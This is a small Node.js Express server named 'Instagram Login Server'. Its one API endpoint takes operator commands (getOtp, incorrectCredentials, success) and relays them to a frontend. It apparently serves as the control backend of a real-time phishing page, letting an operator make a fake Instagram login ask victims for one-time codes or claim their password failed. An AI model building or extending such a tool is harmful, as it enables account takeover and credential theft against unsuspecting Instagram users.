const express = require('express');
const cors = require('cors');

const app = express();

// Enhanced CORS configuration
app.use(cors({
  origin: '*', // Allow all origins for now
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true
}));

app.use(express.json());

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', message: 'Server is running' });
});

// Root endpoint
app.get('/', (req, res) => {
  res.json({ 
    status: 'ok', 
    message: 'Instagram Login Server',
    endpoints: {
      health: '/health',
      loginResponse: '/api/login-response'
    }
  });
});

// Simple API endpoint for console commands
app.post('/api/login-response', (req, res) => {
  const { command } = req.body;
  
  if (!command) {
    return res.status(400).json({ 
      success: false, 
      error: 'Command is required. Use: getOtp, incorrectCredentials, or success' 
    });
  }
  
  const validCommands = ['getOtp', 'incorrectCredentials', 'success'];
  
  if (!validCommands.includes(command)) {
    return res.status(400).json({ 
      success: false, 
      error: `Invalid command. Use one of: ${validCommands.join(', ')}` 
    });
  }
  
  // Return the command to be handled by the frontend
  res.json({ 
    success: true, 
    command: command,
    message: `Command received: ${command}` 
  });
});

const PORT = process.env.PORT || 3001;
const HOST = process.env.HOST || '0.0.0.0';
app.listen(PORT, HOST, () => {
  console.log(`Server running on ${HOST}:${PORT}`);
  console.log('Available commands: getOtp, incorrectCredentials, success');
});
